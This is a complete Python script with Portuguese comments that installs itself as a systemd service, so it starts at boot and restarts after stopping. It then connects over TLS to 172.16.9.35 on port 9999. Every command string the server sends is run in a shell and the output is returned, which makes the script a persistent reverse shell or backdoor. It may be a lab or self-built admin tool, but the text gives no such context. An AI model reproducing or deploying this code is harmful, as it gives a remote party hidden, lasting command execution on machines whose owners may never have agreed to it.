import os
import socket
import ssl
import subprocess
from pathlib import Path

def configurar_servico_systemd():
    nome_servico = "agente"
    arquivo_servico = f"/etc/systemd/system/{nome_servico}.service"
    caminho_script = os.path.abspath(__file__)
    usuario = os.getlogin()

    # Verifica se o arquivo de serviço já existe
    if Path(arquivo_servico).exists():
        print(f"O serviço '{nome_servico}' já está configurado.")
        return

    # Conteúdo do arquivo de serviço
    conteudo_servico = f"""[Unit]
Description=Agente de Conexão Remota
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {caminho_script}
Restart=always
RestartSec=5
User={usuario}

[Install]
WantedBy=multi-user.target
"""

    try:
        # Escreve o arquivo de serviço
        with open(arquivo_servico, "w") as f:
            f.write(conteudo_servico)
        print(f"Arquivo de serviço criado em {arquivo_servico}.")

        # Define as permissões apropriadas
        subprocess.run(["chmod", "644", arquivo_servico], check=True)

        # Recarrega o daemon do systemd
        subprocess.run(["systemctl", "daemon-reload"], check=True)

        # Habilita o serviço para iniciar no boot
        subprocess.run(["systemctl", "enable", nome_servico], check=True)

        # Inicia o serviço imediatamente
        subprocess.run(["systemctl", "start", nome_servico], check=True)

        print(f"Serviço '{nome_servico}' configurado e iniciado com sucesso.")

    except Exception as e:
        print(f"Erro ao configurar o serviço: {e}")

def iniciar_agente():
    # Configurações SSL
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="../ca/ca.crt")
    context.load_cert_chain(certfile="client.crt", keyfile="client.key")

    # Conexão com o servidor
    try:
        with socket.create_connection(('172.16.9.35', 9999)) as sock:
            with context.wrap_socket(sock, server_hostname='lenovolegion') as ssock:
                while True:
                    command = ssock.recv(1024).decode()
                    if not command:
                        break
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    ssock.sendall(output)
    except Exception as e:
        print(f"Erro na conexão com o servidor: {e}")

if __name__ == "__main__":
    configurar_servico_systemd()
    iniciar_agente()